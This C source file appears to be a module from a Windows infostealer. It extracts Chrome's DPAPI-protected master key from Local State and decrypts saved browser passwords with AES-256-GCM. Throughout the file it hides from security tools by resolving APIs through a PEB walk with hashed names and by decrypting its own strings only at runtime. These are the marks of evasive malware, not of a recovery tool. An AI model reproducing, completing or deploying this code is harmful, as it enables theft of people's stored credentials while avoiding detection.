/*
 * chrome_crypto.c — Chrome browser data decryption
 *
 * Decrypts v10/v11 encrypted passwords using AES-256-GCM.
 * Extracts and decrypts the DPAPI-encrypted master key from Local State.
 *
 * Platform: Windows (CryptUnprotectData + BCrypt AES-GCM)
 */

#include "chrome_crypto.h"
#include "config.h"
#include "secure_zero.h"
#include "utils/base64.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#ifdef _WIN32
#include <windows.h>
#include <wincrypt.h>
/* L3: #pragma comment(lib) removed — incompatible with mingw no-CRT; libs resolved via PEB walk */

/* PEB-walk includes for runtime API resolution */
#include "bcrypt_peb.h"
#include "crypt32_peb.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "enc_strings.h"

/* MinGW BCrypt compatibility — define missing constants and types */
#ifndef BCRYPT_SHA1_ALGORITHM
#define BCRYPT_SHA1_ALGORITHM L"SHA1"
#endif
#ifndef BCRYPT_AES_GCM_ALGORITHM
#define BCRYPT_AES_GCM_ALGORITHM L"MS_AES_GCM"
#endif
#ifndef BCRYPT_CHAINING_MODE
#define BCRYPT_CHAINING_MODE L"ChainingMode"
#endif
#ifndef BCRYPT_CHAIN_MODE_GCM
#define BCRYPT_CHAIN_MODE_GCM L"ChainingModeGCM"
#endif
#ifndef BCRYPT_ALG_FLAG_HMAC_FLAG
#define BCRYPT_ALG_FLAG_HMAC_FLAG 0x00000008
#endif

/* MinGW may lack BCrypt types — provide them */
#ifndef __BCRYPT_H__
typedef void *BCRYPT_ALG_HANDLE;
typedef void *BCRYPT_KEY_HANDLE;
typedef long NTSTATUS;

NTSTATUS BCryptOpenAlgorithmProvider(BCRYPT_ALG_HANDLE *, const wchar_t *,
                                     const wchar_t *, unsigned long);
NTSTATUS BCryptCloseAlgorithmProvider(BCRYPT_ALG_HANDLE, unsigned long);
NTSTATUS BCryptSetProperty(BCRYPT_ALG_HANDLE, const wchar_t *, unsigned char *,
                           unsigned long, unsigned long);
NTSTATUS BCryptGenerateSymmetricKey(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE *,
                                    unsigned char *, unsigned long,
                                    unsigned char *, unsigned long, unsigned long);
NTSTATUS BCryptDestroyKey(BCRYPT_KEY_HANDLE);
NTSTATUS BCryptDeriveKeyPBKDF2(BCRYPT_ALG_HANDLE, unsigned char *, unsigned long,
                               unsigned char *, unsigned long, unsigned long,
                               unsigned char *, unsigned long, unsigned long);
NTSTATUS BCryptDecrypt(BCRYPT_KEY_HANDLE, unsigned char *, unsigned long,
                       void *, unsigned char *, unsigned long,
                       unsigned char *, unsigned long, unsigned long *, unsigned long);
#endif

/* BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO — MinGW may not have it */
#ifndef BCRYPT_INIT_AUTH_MODE_INFO
typedef struct _BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
    unsigned long cbSize;
    unsigned long dwInfoVersion;
    unsigned char *pbNonce;
    unsigned long cbNonce;
    unsigned char *pbAuthData;
    unsigned long cbAuthData;
    unsigned char *pbTag;
    unsigned long cbTag;
    unsigned char *pbMacContext;
    unsigned long cbMacContext;
    unsigned long cbAAD;
    unsigned long cbData;
    unsigned long dwFlags;
} BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO;
#define BCRYPT_INIT_AUTH_MODE_INFO(info) do { memset(&(info), 0, sizeof(info)); (info).dwInfoVersion = 1; } while(0)
#endif

/* BCRYPT_KEY_DATA_BLOB_HEADER */
#ifndef BCRYPT_KEY_DATA_BLOB_MAGIC
typedef struct {
    unsigned long dwMagic;
    unsigned long dwVersion;
    unsigned long cbKeyData;
} BCRYPT_KEY_DATA_BLOB_HEADER;
#define BCRYPT_KEY_DATA_BLOB_MAGIC 0x4542444b
#define BCRYPT_KEY_DATA_BLOB_VERSION1 1
#endif

/* memmem compat for MinGW */
static void *compat_memmem(const void *haystack, size_t haystack_len,
                           const void *needle, size_t needle_len) {
    if (needle_len == 0) return (void *)haystack;
    if (needle_len > haystack_len) return NULL;
    const unsigned char *h = (const unsigned char *)haystack;
    const unsigned char *n = (const unsigned char *)needle;
    for (size_t i = 0; i <= haystack_len - needle_len; i++) {
        if (memcmp(h + i, n, needle_len) == 0)
            return (void *)(h + i);
    }
    return NULL;
}
#define memmem compat_memmem

/* File-local PEB-walk for kernel32 misc APIs (GetLastError, LocalFree) */
typedef DWORD (WINAPI *pGetLastError_fn)(void);
typedef HLOCAL (WINAPI *pLocalFree_fn)(HLOCAL);
static struct { pGetLastError_fn pGLE; pLocalFree_fn pLF; int ready; } g_k32_misc;
static int ensure_k32_misc(void) {
    if (g_k32_misc.ready) return 1;
    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!k32) return 0;
    char fn[32];
    enc_decrypt(enc_GetLastError, ENC_GETLASTERROR_LEN, fn);
    g_k32_misc.pGLE = (pGetLastError_fn)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_LocalFree, ENC_LOCALFREE_LEN, fn);
    g_k32_misc.pLF = (pLocalFree_fn)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    if (!g_k32_misc.pGLE || !g_k32_misc.pLF) return 0;
    g_k32_misc.ready = 1;
    return 1;
}

#else
/* Linux stubs — for development/testing only */
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <openssl/err.h>
#endif

/* ── Extract encrypted_key from Local State JSON ─────────────── */

int chrome_extract_encrypted_key(const char *json, size_t json_len,
                                 unsigned char *out, size_t out_max,
                                 size_t *out_len) {
    const char marker[] = "\"encrypted_key\":\"";
    const char *start = memmem(json, json_len, marker, sizeof(marker) - 1);
    if (!start) return -1;

    start += sizeof(marker) - 1;
    const char *end = memchr(start, '"', (size_t)(json + json_len - start));
    if (!end) return -1;

    size_t b64_len = (size_t)(end - start);
    int decoded = base64_decode(start, b64_len, out, out_max);
    if (decoded < 0) return -1;

    *out_len = (size_t)decoded;
    return 0;
}

/* ── DPAPI decrypt (Windows) ─────────────────────────────────── */

#ifdef _WIN32

int chrome_decrypt_dpapi_key(const unsigned char *encrypted_key, size_t len,
                             unsigned char *out, size_t out_max,
                             size_t *out_len) {
    if (len < 2) return -1;

    /* Chrome's encrypted_key after base64 decode starts with "DPAPI" (5 bytes) prefix.
     * Skip it to get to the actual DPAPI blob. */
    size_t offset = 0;
    if (len >= 5 && memcmp(encrypted_key, "DPAPI", 5) == 0)
        offset = 5;

    if (encrypted_key[offset] != 0x01) {
        dbg_printf("[!] chrome_decrypt_dpapi_key: version mismatch: 0x%02x (expected 0x01)\n", encrypted_key[offset]);
        return -1;
    }

    const crypt32_api_t *c32 = mirage_crypt32_api();
    if (!c32) { dbg_printf("[!] crypt32 PEB resolution failed\n"); return -1; }

    DATA_BLOB input, output;
    input.cbData = (DWORD)(len - offset - 1);
    input.pbData = (BYTE *)(encrypted_key + offset + 1);

    if (!c32->pUnprotect(&input, NULL, NULL, NULL, NULL, 0, &output)) {
        if (ensure_k32_misc())
            dbg_printf("[!] CryptUnprotectData failed: GetLastError=%lu\n", g_k32_misc.pGLE());
        return -1;
    }

    size_t copy = (size_t)output.cbData;
    if (copy > out_max) copy = out_max;
    memcpy(out, output.pbData, copy);
    *out_len = copy;

    if (ensure_k32_misc()) g_k32_misc.pLF(output.pbData);
    return 0;
}

/* ── DPAPI decrypt (Linux stub) ──────────────────────────────── */

#else

int chrome_decrypt_dpapi_key(const unsigned char *encrypted_key, size_t len,
                             unsigned char *out, size_t out_max,
                             size_t *out_len) {
    (void)encrypted_key; (void)len; (void)out; (void)out_max; (void)out_len;
    /* DPAPI is Windows-only. On Linux, return error. */
    return -1;
}

#endif

/* ── PBKDF2 key derivation ───────────────────────────────────── */
/* L9: Chrome uses PBKDF2-SHA1 with only 1 iteration — inherited from Chrome's own design.
 * Weak by modern standards but must match Chrome's format to decrypt existing data. */

int chrome_derive_key(unsigned char *out32) {
    /* Chrome v10/v11 uses empty password, "saltysalt" salt, 1 iteration */
    char salt[16]; enc_decrypt(enc_saltysalt, ENC_SALTYSALT_LEN, salt);
    static const int iterations = 1;

#ifdef _WIN32
    const bcrypt_api_t *bc = mirage_bcrypt_api();
    if (!bc) return -1;

    BCRYPT_ALG_HANDLE hAlgo = NULL;
    NTSTATUS status;

    status = bc->pOpen(&hAlgo, BCRYPT_SHA1_ALGORITHM,
                       NULL, BCRYPT_ALG_FLAG_HMAC_FLAG);
    if (status < 0) return -1;

    status = bc->pDerive(hAlgo,
                         (PUCHAR)"", 0,             /* empty password */
                         (PUCHAR)salt, sizeof(salt) - 1,
                         iterations,
                         out32, 32,
                         0);
    bc->pClose(hAlgo, 0);
    return (status >= 0) ? 0 : -1;

#else
    /* OpenSSL fallback */
    int rc = PKCS5_PBKDF2_HMAC_SHA1(
        "", 0,
        (const unsigned char *)salt, (int)(sizeof(salt) - 1),
        iterations, 32, out32);
    return (rc == 1) ? 0 : -1;
#endif
}

/* ── AES-256-GCM decryption ──────────────────────────────────── */

#ifdef _WIN32

int chrome_decrypt_password(const unsigned char *encrypted, size_t len,
                            const unsigned char *key32,
                            unsigned char *out, size_t out_max,
                            size_t *out_len) {
    /* v10/v11/v20 format: 3 bytes version + 12 bytes nonce + ciphertext + 16 bytes tag */
    if (len < 3 + 12 + 16) return -1;
    if (memcmp(encrypted, "v10", 3) != 0 && memcmp(encrypted, "v11", 3) != 0 &&
        memcmp(encrypted, "v20", 3) != 0)
        return -1;

    const unsigned char *nonce = encrypted + 3;
    const unsigned char *ciphertext = encrypted + 15;
    size_t ct_len = len - 15 - 16;
    const unsigned char *tag = encrypted + len - 16;

    if (out_max < ct_len) return -1;

    const bcrypt_api_t *bc = mirage_bcrypt_api();
    if (!bc) return -1;

    BCRYPT_ALG_HANDLE hAlgo = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;

    status = bc->pOpen(&hAlgo, BCRYPT_AES_GCM_ALGORITHM,
                       NULL, 0);
    if (status < 0) return -1;

    status = bc->pSetProp(hAlgo, BCRYPT_CHAINING_MODE,
                          (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                          sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (status < 0) { bc->pClose(hAlgo, 0); return -1; }

    BCRYPT_KEY_DATA_BLOB_HEADER keyBlob;
    keyBlob.dwMagic = BCRYPT_KEY_DATA_BLOB_MAGIC;
    keyBlob.dwVersion = BCRYPT_KEY_DATA_BLOB_VERSION1;
    keyBlob.cbKeyData = 32;

    size_t blob_size = sizeof(keyBlob) + 32;
    unsigned char *blob = (unsigned char *)malloc(blob_size);
    if (!blob) { bc->pClose(hAlgo, 0); return -1; }
    memcpy(blob, &keyBlob, sizeof(keyBlob));
    memcpy(blob + sizeof(keyBlob), key32, 32);

    status = bc->pGenKey(hAlgo, &hKey, NULL, 0,
                         blob, (ULONG)blob_size, 0);
    mirage_secure_zero(blob, blob_size);
    free(blob);

    /* Build auth info (empty for Chrome) and IV struct */
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)nonce;
    authInfo.cbNonce = 12;
    authInfo.pbTag = (PUCHAR)tag;
    authInfo.cbTag = 16;

    ULONG resultLen = 0;
    status = bc->pDecrypt(hKey,
                          (PUCHAR)ciphertext, (ULONG)ct_len,
                          &authInfo,
                          NULL, 0,
                          out, (ULONG)out_max,
                          &resultLen,
                          0);

    bc->pDestroyKey(hKey);
    bc->pClose(hAlgo, 0);

    *out_len = (size_t)resultLen;
    return 0;
}

#else

/* Linux: OpenSSL AES-256-GCM */
int chrome_decrypt_password(const unsigned char *encrypted, size_t len,
                            const unsigned char *key32,
                            unsigned char *out, size_t out_max,
                            size_t *out_len) {
    if (len < 3 + 12 + 16) return -1;
    if (memcmp(encrypted, "v10", 3) != 0 && memcmp(encrypted, "v11", 3) != 0 &&
        memcmp(encrypted, "v20", 3) != 0)
        return -1;

    const unsigned char *nonce = encrypted + 3;
    const unsigned char *ciphertext = encrypted + 15;
    size_t ct_len = len - 15 - 16;
    const unsigned char *tag = encrypted + len - 16;

    if (out_max < ct_len) return -1;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return -1;

    int rc = 0;
    int outl = 0;
    int total = 0;

    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1)
        goto fail;
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, NULL) != 1)
        goto fail;
    if (EVP_DecryptInit_ex(ctx, NULL, NULL, key32, nonce) != 1)
        goto fail;
    if (EVP_DecryptUpdate(ctx, out, &outl, ciphertext, (int)ct_len) != 1)
        goto fail;
    total = outl;
    if (EVP_DecryptUpdate(ctx, NULL, &outl, NULL, 0) != 1)
        goto fail;
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16,
                            (void *)tag) != 1)
        goto fail;
    rc = EVP_DecryptFinal_ex(ctx, out + total, &outl);
    total += outl;

    EVP_CIPHER_CTX_free(ctx);

    if (rc <= 0) return -1;
    *out_len = (size_t)total;
    return 0;

fail:
    EVP_CIPHER_CTX_free(ctx);
    return -1;
}

#endif
